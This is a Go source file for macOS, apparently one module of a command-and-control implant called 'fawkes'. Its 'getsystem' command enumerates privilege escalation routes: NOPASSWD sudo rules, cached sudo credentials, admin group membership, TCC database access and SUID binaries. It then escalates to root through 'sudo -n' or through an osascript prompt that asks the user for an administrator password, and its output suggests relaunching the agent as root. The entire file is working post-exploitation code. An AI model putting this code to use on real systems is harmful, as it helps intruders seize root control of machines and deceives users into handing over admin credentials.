//go:build darwin
// +build darwin

package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type GetSystemCommand struct{}

func (c *GetSystemCommand) Name() string {
	return "getsystem"
}

func (c *GetSystemCommand) Description() string {
	return "Attempt privilege escalation to root via sudo or osascript elevation prompt"
}

type getSystemArgs struct {
	Technique string `json:"technique"`
}

func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
	var args getSystemArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Failed to parse parameters: %v", err)
		}
	}

	if args.Technique == "" {
		args.Technique = "check"
	}

	oldIdentity := getCurrentDarwinIdentity()

	switch strings.ToLower(args.Technique) {
	case "check":
		return getsystemCheckDarwin(oldIdentity)
	case "sudo":
		return getsystemSudoDarwin(oldIdentity)
	case "osascript":
		return getsystemOsascript(oldIdentity)
	default:
		return errorf("Unknown technique: %s. Available: check, sudo, osascript", args.Technique)
	}
}

func getCurrentDarwinIdentity() string {
	u, err := user.Current()
	if err != nil {
		return fmt.Sprintf("uid=%d", os.Getuid())
	}
	return fmt.Sprintf("%s (uid=%s, gid=%s)", u.Username, u.Uid, u.Gid)
}

// getsystemCheckDarwin enumerates privilege escalation vectors on macOS
func getsystemCheckDarwin(currentIdentity string) structs.CommandResult {
	if os.Getuid() == 0 {
		return successResult(fmt.Sprintf("[+] Already running as root\nCurrent: %s", currentIdentity))
	}

	type escalationVector struct {
		Method      string   `json:"method"`
		Description string   `json:"description"`
		Risk        string   `json:"risk"`
		Paths       []string `json:"paths,omitempty"`
	}

	var vectors []escalationVector

	// Check sudo NOPASSWD
	sudoPaths := checkSudoNopasswdDarwin()
	if len(sudoPaths) > 0 {
		vectors = append(vectors, escalationVector{
			Method:      "sudo",
			Description: "NOPASSWD sudo rules detected",
			Risk:        "high",
			Paths:       sudoPaths,
		})
	}

	// Check sudo cached credentials
	if checkSudoCachedDarwin() {
		vectors = append(vectors, escalationVector{
			Method:      "sudo-cached",
			Description: "Sudo credentials are cached",
			Risk:        "high",
		})
	}

	// Check if user is in admin group
	if checkAdminGroup() {
		vectors = append(vectors, escalationVector{
			Method:      "osascript",
			Description: "User is in admin group — can use osascript to prompt for elevation",
			Risk:        "medium",
		})
	}

	// Check TCC permissions that could help
	tccPerms := checkTCCEscalation()
	if len(tccPerms) > 0 {
		vectors = append(vectors, escalationVector{
			Method:      "tcc",
			Description: "TCC permissions that may assist privilege escalation",
			Risk:        "low",
			Paths:       tccPerms,
		})
	}

	// Check for known SUID binaries
	suidBins := findSUIDDarwin()
	if len(suidBins) > 0 {
		vectors = append(vectors, escalationVector{
			Method:      "suid",
			Description: "SUID binaries found",
			Risk:        "low",
			Paths:       suidBins,
		})
	}

	result := map[string]interface{}{
		"current_identity": currentIdentity,
		"uid":              os.Getuid(),
		"vectors":          vectors,
		"total":            len(vectors),
	}

	output, _ := json.MarshalIndent(result, "", "  ")
	return successResult(string(output))
}

// checkSudoNopasswdDarwin checks for NOPASSWD sudo rules
func checkSudoNopasswdDarwin() []string {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sudo", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil
	}

	var nopasswdRules []string
	for _, line := range strings.Split(string(output), "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.Contains(trimmed, "NOPASSWD") {
			nopasswdRules = append(nopasswdRules, trimmed)
		}
	}
	return nopasswdRules
}

// checkSudoCachedDarwin tests if sudo credentials are cached
func checkSudoCachedDarwin() bool {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sudo", "-n", "true")
	return cmd.Run() == nil
}

// checkAdminGroup checks if the current user is in the admin group
func checkAdminGroup() bool {
	u, err := user.Current()
	if err != nil {
		return false
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "dscl", ".", "-read", "/Groups/admin", "GroupMembership")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false
	}

	return strings.Contains(string(output), u.Username)
}

// checkTCCEscalation checks for TCC permissions that might help with escalation
func checkTCCEscalation() []string {
	var perms []string

	// Check if Full Disk Access is granted (useful for reading sensitive files)
	testPaths := []string{
		"/Library/Application Support/com.apple.TCC/TCC.db",
		"/private/var/db/dslocal/nodes/Default",
	}
	for _, path := range testPaths {
		if _, err := os.Stat(path); err == nil {
			perms = append(perms, fmt.Sprintf("Accessible: %s", path))
		}
	}

	return perms
}

// findSUIDDarwin checks for SUID binaries on macOS
func findSUIDDarwin() []string {
	suidPaths := []string{
		"/usr/bin/sudo",
		"/usr/bin/su",
		"/usr/bin/at",
		"/usr/bin/atq",
		"/usr/bin/atrm",
		"/usr/bin/crontab",
		"/usr/bin/login",
		"/usr/bin/newgrp",
		"/usr/sbin/traceroute",
	}

	var found []string
	for _, path := range suidPaths {
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		if info.Mode()&os.ModeSetuid != 0 {
			found = append(found, path)
		}
	}
	return found
}

// getsystemSudoDarwin attempts elevation via sudo
func getsystemSudoDarwin(oldIdentity string) structs.CommandResult {
	if os.Getuid() == 0 {
		return successResult(fmt.Sprintf("[+] Already running as root\nCurrent: %s", oldIdentity))
	}

	if !checkSudoCachedDarwin() {
		rules := checkSudoNopasswdDarwin()
		if len(rules) == 0 {
			return errorResult("Error: sudo requires a password and no NOPASSWD rules found. Try 'osascript' technique for elevation prompt.")
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sudo", "-n", "id")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return errorf("Error: sudo -n id failed: %v\n%s", err, string(output))
	}

	selfPath, _ := os.Executable()
	selfPath, _ = filepath.EvalSymlinks(selfPath)

	result := fmt.Sprintf("[+] Successfully elevated to root via sudo\n")
	result += fmt.Sprintf("Previous: %s\n", oldIdentity)
	result += fmt.Sprintf("New: %s\n", strings.TrimSpace(string(output)))
	result += fmt.Sprintf("Agent path: %s\n", selfPath)
	result += "\n[*] Deploy a root callback with: sudo -n /path/to/agent"

	return successResult(result)
}

// getsystemOsascript uses AppleScript to prompt user for admin credentials
func getsystemOsascript(oldIdentity string) structs.CommandResult {
	if os.Getuid() == 0 {
		return successResult(fmt.Sprintf("[+] Already running as root\nCurrent: %s", oldIdentity))
	}

	if !checkAdminGroup() {
		return errorResult("Error: user is not in the admin group — osascript elevation prompt will fail")
	}

	// Use osascript to run a privileged command via admin auth prompt
	script := `do shell script "id" with administrator privileges`

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second) // 2 min for user to respond
	defer cancel()

	cmd := exec.CommandContext(ctx, "osascript", "-e", script)
	output, err := cmd.CombinedOutput()
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return errorResult("Error: elevation prompt timed out (120s)")
		}
		return errorf("Error: osascript elevation failed: %v\n%s", err, string(output))
	}

	selfPath, _ := os.Executable()
	selfPath, _ = filepath.EvalSymlinks(selfPath)

	result := fmt.Sprintf("[+] Successfully elevated via osascript admin prompt\n")
	result += fmt.Sprintf("Previous: %s\n", oldIdentity)
	result += fmt.Sprintf("Elevated: %s\n", strings.TrimSpace(string(output)))
	result += fmt.Sprintf("Agent path: %s\n", selfPath)
	result += "\n[*] Deploy a root callback with: osascript -e 'do shell script \"/path/to/agent\" with administrator privileges'"

	return successResult(result)
}
